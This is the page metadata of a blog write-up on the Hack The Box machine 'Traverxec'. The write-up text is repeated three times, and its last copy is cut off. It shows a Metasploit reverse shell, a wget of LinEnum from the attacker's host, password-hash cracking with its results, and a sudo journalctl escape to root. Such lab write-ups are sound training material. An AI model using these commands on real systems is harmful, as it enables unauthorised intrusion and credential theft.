<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Traverxec" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="This box was the last Easy box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.165 traverxec.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traverxec.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-21 04:12 EST Nmap scan report for traverxec.htb (10.10.10.165) Host is up (0.26s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Seems like an online portfolio? There aren’t any pages to visit but there was a form which submits to a empty.html, which contained nothing useful. Lets see if we can find any exploits using searchsploit. 1 2 3 4 5 6 7 8 9 $ searchsploit nostromo -------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------- ---------------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | exploits/multiple/remote/47573.rb nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | exploits/linux/remote/35466.sh -------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Exploitation Awesome, lets use the Metasploit exploit to get a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ msfconsole msf5 &gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/http/nostromo_code_exec) &gt; set RHOSTS traverxec.htb RHOSTS =&gt; traverxec.htb msf5 exploit(multi/http/nostromo_code_exec) &gt; set ForceExploit true ForceExploit =&gt; true msf5 exploit(multi/http/nostromo_code_exec) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.165:37316) at 2019-12-21 04:21:24 -0500 There’s no prompt but lets try to upgrade to a tty shell. 1 2 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@traverxec:/usr/bin$ Enumeration (2) Lets see if running LinEnum will give us any insights on how to carry on. I will be starting a web server on my machine using the builtin SimpleHTTPServer module in python and use wget to retrieve it. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@traverxec:/usr/bin$ cd /tmp www-data@traverxec:/tmp$ wget http://10.10.XX.XX/LinEnum.sh --2019-12-31 09:22:23-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; LinEnum.sh 100%[===================&gt;] 45.39K 59.2KB/s in 0.8s 2019-12-31 09:22:24 (59.2 KB/s) - &#39;LinEnum.sh&#39; saved [46476/46476] www-data@traverxec:/tmp$ Running LinEnum.sh shows that there is a username and a password hash in a .htaccess file. 1 2 3 4 5 6 www-data@traverxec:/tmp$ ./LinEnum.sh ... [-] htpasswd found - could contain passwords: /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ... To crack it, I will be using hashcat. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt ... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me Session..........: hashcat Status...........: Cracked Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Time.Started.....: Sat Dec 21 09:07:19 2019 (5 mins, 0 secs) Time.Estimated...: Sat Dec 21 09:12:19 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 36494 H/s (6.67ms) @ Accel:256 Loops:125 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10776576/14344385 (75.13%) Rejected.........: 0/10776576 (0.00%) Restore.Point....: 10774528/14344385 (75.11%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000 Candidates.#1....: OBADIAH -&gt; Nov25th Started: Sat Dec 21 09:07:16 2019 Stopped: Sat Dec 21 09:12:20 2019 sshing as david did not work with david:Nowonly4me, so lets try taking a look at his home directory. 1 2 www-data@traverxec:/usr/bin$ ls /home/david ls: cannot open directory &#39;/home/david&#39;: Permission denied Kind of a deadend here so I scouted the forums for hints and many were saying to study the config of the nostromo service carefully. /var/nostromo/conf/nhttpd.conf: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www If we look at the documentation for the nostromo service, 1 2 3 4 5 HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ ... Hmm… If we append ~ in front of david to the URL, we get http://traverxec.htb/~david. Nothing much here but we are getting somewhere. If we read more of the documentation, 1 2 3 HOMEDIRS ... You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option This means that the directory public_www must exist in the home directory of the users for this feature to work. Lets try browsing to /home/david/public_www. 1 2 3 www-data@traverxec:/home/david/public_www$ ls ls index.html protected-file-area What do we have here ? Inside the protected-file-area, we find a backup of ssh files. 1 2 www-data@traverxec:/home/david/public_www$ ls protected-file-area backup-ssh-identity-files.tgz Couldn’t find any curl or ftp on the machine to upload the files to us, so lets see if we can access the folder via the browser at http://traverxec.htb/~david/protected-file-area. We get prompted for authentication, keyed in david:Nowonly4me and we can now proceed to download the file. To extract the contents, we run tar on it. 1 2 3 4 5 $ tar -xvf backup-ssh-identity-files.tgz home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub Lets see if we can ssh using the private ssh key. 1 2 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Seems like we need a passphrase. Lets see if we can crack it with john. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python ssh2john.py id_rsa &gt; david.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt david.hash Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status hunter (id_rsa) Warning: Only 2 candidates left, minimum 8 needed for performance. 1g 0:00:00:02 DONE (2019-12-21 22:53) 0.4132g/s 5926Kp/s 5926Kc/s 5926KC/sa6_123..*7¡Vamos! Session completed user.txt With the passphrase, lets try sshing as david and retrieve the user flag. 1 2 3 4 5 6 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Wed Jan 1 02:54:14 2020 from 10.10.XX.XX david@traverxec:~$ cat user.txt 7db0XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In david’s home directory , we see an interesting directory called bin. 1 2 3 4 david@traverxec:~$ ls bin public_www user.txt david@traverxec:~$ ls bin server-stats.head server-stats.sh server-stats.head contained an ASCII banner while server-stats.sh contained some commands. 1 2 3 4 5 6 7 8 9 10 11 david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo &quot;Load: `/usr/bin/uptime`&quot; echo &quot; &quot; echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot; echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot; echo &quot; &quot; echo &quot;Last 5 journal log lines:&quot; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat On the last line, we see a sudo command being ran. Running the sudo command with the journalctl command simply prints some logs to the screen. 1 2 3 4 5 6 7 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:38:03 EST. -- Jan 01 02:50:20 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:11:32 traverxec nhttpd[810]: stopped Jan 01 03:13:22 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:20:37 traverxec crontab[1414]: (www-data) LIST (www-data) Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 According to journalctl’s entry in GTFOBins, we see that we are able to break out by spawning a shell by entering !/bin/sh. But where can we enter the command ? According to the man page of journalctl, the output is piped to less! 1 2 3 4 5 ... The output is paged through less by default, and long lines are &quot;truncated&quot; to screen width. The hidden part can be viewed by using the left-arrow and right-arrow keys. Paging can be disabled; see the --no-pager option and the &quot;Environment&quot; section below. ... less will only work as intended if the output is more than the capacity of the terminal screen, hence if we shrink the width of it and run the command again, 1 2 3 4 5 6 7 - Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:45:55 EST. -- Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 Jan 01 03:44:32 traverxec su[1670]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:44:34 traverxec su[1670]: FAILED SU (to david) www-data on pts/9 Jan 01 03:45:04 traverxec su[1674]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:45:05 traverxec su[1674]: FAILED SU (to david) www-data on pts/9 lines 1-6/6 (END) root.txt We get a somewhat incomplete output and by entering !/bin/sh, we get a shell as root! 1 2 3 4 5 !/bin/sh # whoami root # cat /root/root.txt 9aa3XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="This box was the last Easy box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.165 traverxec.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traverxec.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-21 04:12 EST Nmap scan report for traverxec.htb (10.10.10.165) Host is up (0.26s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Seems like an online portfolio? There aren’t any pages to visit but there was a form which submits to a empty.html, which contained nothing useful. Lets see if we can find any exploits using searchsploit. 1 2 3 4 5 6 7 8 9 $ searchsploit nostromo -------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------- ---------------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | exploits/multiple/remote/47573.rb nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | exploits/linux/remote/35466.sh -------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Exploitation Awesome, lets use the Metasploit exploit to get a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ msfconsole msf5 &gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/http/nostromo_code_exec) &gt; set RHOSTS traverxec.htb RHOSTS =&gt; traverxec.htb msf5 exploit(multi/http/nostromo_code_exec) &gt; set ForceExploit true ForceExploit =&gt; true msf5 exploit(multi/http/nostromo_code_exec) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.165:37316) at 2019-12-21 04:21:24 -0500 There’s no prompt but lets try to upgrade to a tty shell. 1 2 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@traverxec:/usr/bin$ Enumeration (2) Lets see if running LinEnum will give us any insights on how to carry on. I will be starting a web server on my machine using the builtin SimpleHTTPServer module in python and use wget to retrieve it. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@traverxec:/usr/bin$ cd /tmp www-data@traverxec:/tmp$ wget http://10.10.XX.XX/LinEnum.sh --2019-12-31 09:22:23-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; LinEnum.sh 100%[===================&gt;] 45.39K 59.2KB/s in 0.8s 2019-12-31 09:22:24 (59.2 KB/s) - &#39;LinEnum.sh&#39; saved [46476/46476] www-data@traverxec:/tmp$ Running LinEnum.sh shows that there is a username and a password hash in a .htaccess file. 1 2 3 4 5 6 www-data@traverxec:/tmp$ ./LinEnum.sh ... [-] htpasswd found - could contain passwords: /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ... To crack it, I will be using hashcat. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt ... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me Session..........: hashcat Status...........: Cracked Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Time.Started.....: Sat Dec 21 09:07:19 2019 (5 mins, 0 secs) Time.Estimated...: Sat Dec 21 09:12:19 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 36494 H/s (6.67ms) @ Accel:256 Loops:125 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10776576/14344385 (75.13%) Rejected.........: 0/10776576 (0.00%) Restore.Point....: 10774528/14344385 (75.11%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000 Candidates.#1....: OBADIAH -&gt; Nov25th Started: Sat Dec 21 09:07:16 2019 Stopped: Sat Dec 21 09:12:20 2019 sshing as david did not work with david:Nowonly4me, so lets try taking a look at his home directory. 1 2 www-data@traverxec:/usr/bin$ ls /home/david ls: cannot open directory &#39;/home/david&#39;: Permission denied Kind of a deadend here so I scouted the forums for hints and many were saying to study the config of the nostromo service carefully. /var/nostromo/conf/nhttpd.conf: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www If we look at the documentation for the nostromo service, 1 2 3 4 5 HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ ... Hmm… If we append ~ in front of david to the URL, we get http://traverxec.htb/~david. Nothing much here but we are getting somewhere. If we read more of the documentation, 1 2 3 HOMEDIRS ... You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option This means that the directory public_www must exist in the home directory of the users for this feature to work. Lets try browsing to /home/david/public_www. 1 2 3 www-data@traverxec:/home/david/public_www$ ls ls index.html protected-file-area What do we have here ? Inside the protected-file-area, we find a backup of ssh files. 1 2 www-data@traverxec:/home/david/public_www$ ls protected-file-area backup-ssh-identity-files.tgz Couldn’t find any curl or ftp on the machine to upload the files to us, so lets see if we can access the folder via the browser at http://traverxec.htb/~david/protected-file-area. We get prompted for authentication, keyed in david:Nowonly4me and we can now proceed to download the file. To extract the contents, we run tar on it. 1 2 3 4 5 $ tar -xvf backup-ssh-identity-files.tgz home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub Lets see if we can ssh using the private ssh key. 1 2 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Seems like we need a passphrase. Lets see if we can crack it with john. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python ssh2john.py id_rsa &gt; david.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt david.hash Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status hunter (id_rsa) Warning: Only 2 candidates left, minimum 8 needed for performance. 1g 0:00:00:02 DONE (2019-12-21 22:53) 0.4132g/s 5926Kp/s 5926Kc/s 5926KC/sa6_123..*7¡Vamos! Session completed user.txt With the passphrase, lets try sshing as david and retrieve the user flag. 1 2 3 4 5 6 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Wed Jan 1 02:54:14 2020 from 10.10.XX.XX david@traverxec:~$ cat user.txt 7db0XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In david’s home directory , we see an interesting directory called bin. 1 2 3 4 david@traverxec:~$ ls bin public_www user.txt david@traverxec:~$ ls bin server-stats.head server-stats.sh server-stats.head contained an ASCII banner while server-stats.sh contained some commands. 1 2 3 4 5 6 7 8 9 10 11 david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo &quot;Load: `/usr/bin/uptime`&quot; echo &quot; &quot; echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot; echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot; echo &quot; &quot; echo &quot;Last 5 journal log lines:&quot; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat On the last line, we see a sudo command being ran. Running the sudo command with the journalctl command simply prints some logs to the screen. 1 2 3 4 5 6 7 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:38:03 EST. -- Jan 01 02:50:20 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:11:32 traverxec nhttpd[810]: stopped Jan 01 03:13:22 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:20:37 traverxec crontab[1414]: (www-data) LIST (www-data) Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 According to journalctl’s entry in GTFOBins, we see that we are able to break out by spawning a shell by entering !/bin/sh. But where can we enter the command ? According to the man page of journalctl, the output is piped to less! 1 2 3 4 5 ... The output is paged through less by default, and long lines are &quot;truncated&quot; to screen width. The hidden part can be viewed by using the left-arrow and right-arrow keys. Paging can be disabled; see the --no-pager option and the &quot;Environment&quot; section below. ... less will only work as intended if the output is more than the capacity of the terminal screen, hence if we shrink the width of it and run the command again, 1 2 3 4 5 6 7 - Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:45:55 EST. -- Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 Jan 01 03:44:32 traverxec su[1670]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:44:34 traverxec su[1670]: FAILED SU (to david) www-data on pts/9 Jan 01 03:45:04 traverxec su[1674]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:45:05 traverxec su[1674]: FAILED SU (to david) www-data on pts/9 lines 1-6/6 (END) root.txt We get a somewhat incomplete output and by entering !/bin/sh, we get a shell as root! 1 2 3 4 5 !/bin/sh # whoami root # cat /root/root.txt 9aa3XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/traverxec-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/traverxec-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-12T02:48:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Traverxec" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/traverxec-htb/"},"description":"This box was the last Easy box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.165 traverxec.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traverxec.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-21 04:12 EST Nmap scan report for traverxec.htb (10.10.10.165) Host is up (0.26s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Seems like an online portfolio? There aren’t any pages to visit but there was a form which submits to a empty.html, which contained nothing useful. Lets see if we can find any exploits using searchsploit. 1 2 3 4 5 6 7 8 9 $ searchsploit nostromo -------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------- ---------------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | exploits/multiple/remote/47573.rb nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | exploits/linux/remote/35466.sh -------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Exploitation Awesome, lets use the Metasploit exploit to get a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ msfconsole msf5 &gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/http/nostromo_code_exec) &gt; set RHOSTS traverxec.htb RHOSTS =&gt; traverxec.htb msf5 exploit(multi/http/nostromo_code_exec) &gt; set ForceExploit true ForceExploit =&gt; true msf5 exploit(multi/http/nostromo_code_exec) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.165:37316) at 2019-12-21 04:21:24 -0500 There’s no prompt but lets try to upgrade to a tty shell. 1 2 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@traverxec:/usr/bin$ Enumeration (2) Lets see if running LinEnum will give us any insights on how to carry on. I will be starting a web server on my machine using the builtin SimpleHTTPServer module in python and use wget to retrieve it. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@traverxec:/usr/bin$ cd /tmp www-data@traverxec:/tmp$ wget http://10.10.XX.XX/LinEnum.sh --2019-12-31 09:22:23-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; LinEnum.sh 100%[===================&gt;] 45.39K 59.2KB/s in 0.8s 2019-12-31 09:22:24 (59.2 KB/s) - &#39;LinEnum.sh&#39; saved [46476/46476] www-data@traverxec:/tmp$ Running LinEnum.sh shows that there is a username and a password hash in a .htaccess file. 1 2 3 4 5 6 www-data@traverxec:/tmp$ ./LinEnum.sh ... [-] htpasswd found - could contain passwords: /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ... To crack it, I will be using hashcat. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt ... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me Session..........: hashcat Status...........: Cracked Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) Hash.Target......: 